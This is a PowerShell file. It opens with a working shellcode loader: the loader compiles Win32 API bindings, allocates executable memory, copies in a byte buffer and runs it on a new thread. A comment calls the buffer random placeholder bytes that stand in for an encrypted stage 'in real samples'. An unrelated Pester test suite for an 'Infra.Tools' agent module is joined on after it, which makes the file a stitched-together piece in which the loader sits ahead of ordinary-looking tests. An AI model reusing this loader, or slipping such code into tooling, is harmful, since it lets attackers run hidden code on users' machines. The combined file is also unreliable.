

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x87, 0x73, 0x67, 0x33, 0x07, 0x0b, 0x1d, 0xef, 0x4d, 0xa4, 0x0a, 0x60, 0xa2, 0x84, 0x5d, 0x84,
        0xf9, 0xa7, 0x4e, 0x04, 0x34, 0x5f, 0xce, 0x20, 0x9e, 0x8f, 0x6f, 0xc5, 0x10, 0x21, 0x41, 0x73,
        0x9b, 0xc6, 0x52, 0xc5, 0x04, 0xfa, 0x2d, 0xc3, 0x0e, 0x0c, 0x62, 0x30, 0x92, 0x84, 0x69, 0x75,
        0xc7, 0xc5, 0x71, 0x87, 0x28, 0x8d, 0x75, 0x24, 0x23, 0xe5, 0x3a, 0x06, 0xa8, 0x47, 0x26, 0x49,
        0xa5, 0x1e, 0x0f, 0x1e, 0x8c, 0x1b, 0x5a, 0x7a, 0x7b, 0x69, 0x1b, 0x54, 0x04, 0xce, 0x7b, 0x12,
        0x82, 0xa8, 0x10, 0x2c, 0x24, 0xee, 0x9b, 0x2e, 0x0f, 0xf6, 0x4f, 0x07, 0x13, 0x5f, 0xba, 0xeb,
        0x10, 0x41, 0x78, 0x6b, 0x05, 0x91, 0x32, 0x8a, 0x3c, 0x4d, 0xb7, 0x1a, 0x1f, 0xe2, 0x3a, 0xa4,
        0xf8, 0x1e, 0x13, 0x52, 0xe8, 0xac, 0x6a, 0x6d, 0x99, 0x0c, 0xef, 0x52, 0x1a, 0xc8, 0xb8, 0x46,
        0xd9, 0x57, 0x2c, 0x87, 0x8e, 0x63, 0xe0, 0xca, 0xdb, 0x85, 0x43, 0x1c, 0xd1, 0xd3, 0x8e, 0x6c,
        0x7f, 0xd4, 0xbe, 0x2d, 0x3a, 0x4b, 0x7b, 0x77, 0xf9, 0x4f, 0xec, 0x48, 0xaf, 0xc4, 0xd7, 0x44,
        0x98, 0x37, 0x05, 0x93, 0x38, 0x99, 0x40, 0x60, 0x50, 0x39, 0x60, 0x17, 0x0a, 0xcf, 0x9a, 0x1b,
        0x16, 0x5f, 0x7e, 0xfd, 0xac, 0xdc, 0x08, 0xca, 0xdf, 0x5c, 0x27, 0xb7, 0x71
    )

    $BufferAddress = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 1326)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$ProgressPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Infra.Tools.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ReportStatus' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ReportStatus -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Set-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 9443 }
        @{ Name = 'SecondaryAgent'; Expected = 9543 }
    ) {
        param($Name, $Expected)
        $config = Set-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'InfraRelay'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Infra.Tools -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
